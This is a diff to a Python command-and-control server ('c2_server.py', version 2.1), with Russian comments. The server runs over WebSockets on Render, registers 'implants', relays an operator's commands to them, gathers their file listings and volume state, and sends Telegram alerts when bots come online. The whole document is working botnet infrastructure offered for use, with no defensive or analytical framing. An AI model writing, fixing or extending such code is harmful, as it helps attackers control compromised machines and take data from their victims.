@@ -1,8 +1,7 @@
 #
-# --- Файл: c2_server.py (Версия 2.0 - Модернизированный) ---
-# Твой шаблон с двумя критическими исправлениями:
-# 1. Добавлен Heartbeat для стабильного соединения на Render.
-# 2. Добавлена "память" для правильной обработки get_details.
+# --- Файл: c2_server.py (Версия 2.1 - Синхронизированный) ---
+# Исправлен формат отправки списка ботов, чтобы он совпадал
+# с тем, который ожидает index.html v6.6.
 #
 import asyncio
 import json
@@ -28,7 +27,6 @@ IMPLANTS, OPERATOR = {}, None
 async def websocket_handler(request):
     global OPERATOR, IMPLANTS
 
-    # --- МОДЕРНИЗАЦИЯ №1: СЕРДЕЧНЫЙ РИТМ ---
     ws = web.WebSocketResponse(heartbeat=25.0)
     await ws.prepare(request)
 
@@ -43,11 +41,7 @@ async def websocket_handler(request):
             await broadcast_bot_list()
         elif client_type == 'implant':
             client_id = initial_msg.get('id')
-            # --- МОДЕРНИЗАЦИЯ №2: ПАМЯТЬ ---
-            IMPLANTS[client_id] = {
-                "ws": ws,
-                "initial_data": initial_msg # Сохраняем все начальные данные
-            }
+            IMPLANTS[client_id] = { "ws": ws, "initial_data": initial_msg }
             print(f"[+] Новый имплант онлайн: {client_id}")
             send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
             await broadcast_bot_list()
@@ -68,16 +62,14 @@ async def websocket_handler(request):
                     if data['type'] == 'command' and target_id in IMPLANTS:
                         await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                     elif data['type'] == 'get_details' and target_id in IMPLANTS:
-                        # Отдаем детали из "памяти"
                         initial_data = IMPLANTS[target_id].get("initial_data", {})
-                        details = {
+                        details ={
                             "files": initial_data.get("files"),
                             "volume_state": initial_data.get("volume_state") 
                         }
                         await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
 
                 elif client_type == 'implant':
-                    # Просто пересылаем все обновления от импланта оператору
                     data['bot_id'] = client_id
                     if OPERATOR and not OPERATOR.closed:
                         await OPERATOR.send_json(data)
@@ -97,13 +89,15 @@ async def websocket_handler(request):
             print("[-] Оператор отключился.")
     return ws
 
+# <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
 async def broadcast_bot_list():
+    """Отправляет оператору детальный список ботов в виде объектов."""
     if OPERATOR and not OPERATOR.closed:
-        bot_ids = list(IMPLANTS.keys())
-        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
+        # Собираем список ОБЪЕКТОВ, а не просто имен
+        bot_list_with_details = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
+        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list_with_details})
 
 async def http_handler(request):
-    # Используем правильный путь к файлу
     return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))
 
 async def main():
@@ -112,11 +106,10 @@ async def main():
     app.router.add_get('/ws', websocket_handler)
     runner = web.AppRunner(app)
     await runner.setup()
-    # Используем порт из переменных окружения для Render
     port = int(os.environ.get("PORT", 10000))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"====== C2 SERVER (V2.0 Модерн) ONLINE на порту {port} ======")
+    print(f"====== C2 SERVER (V2.1 Синхрон) ONLINE на порту {port} ======")
     send_telegram_message("🚀 Сервер запущен.")
     await asyncio.Event().wait()
 
@@ -126,5 +119,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\nСервер остановлен вручную.")
     finally:
-        # Уведомление об остановке при ручном выключении
         send_telegram_message("🛑 Сервер 'Крепость' остановлен.")
